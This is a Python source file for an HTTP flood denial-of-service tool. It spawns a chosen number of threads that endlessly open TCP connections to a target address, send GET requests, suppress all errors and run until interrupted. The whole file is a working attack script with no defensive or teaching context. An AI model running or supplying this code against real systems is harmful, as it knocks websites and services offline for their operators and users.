import logging
import socket

from threading import Thread

class _Manager:
    def __init__(self, target: str, dport: int, num_of_threads: int = 1):
        self.target = target
        self.dport = dport
        self.num_of_threads = num_of_threads

        self.running = False
        self.threads: list[Thread] = []

    def start(self):
        self.running = True

        logging.debug("Starting threads...")
        for _ in range(self.num_of_threads):
            t = Thread(target=self._http_flood, args=(self.target, self.dport))
            t.start()
            self.threads.append(t)
        
        logging.debug("Started threads.")

    def stop(self):
        self.running = False

        for t in self.threads:
            t.join()

    def _http_flood(self, target: str, dport: int):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target, dport))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + bytes(target, "utf-8") + b"\r\n\r\n")
                sock.close()
            except:
                pass

def http_flood(target_ip: str, target_port: int, num_of_threads: int = 1):
    logging.info(f'Starting HTTP flood on {target_ip}:{target_port}')

    try:
        manager = _Manager(target_ip, target_port, num_of_threads)
        manager.start()
        
        while True:
            pass
    except KeyboardInterrupt:
        logging.info('\rStopping HTTP flood attack')
        manager.stop()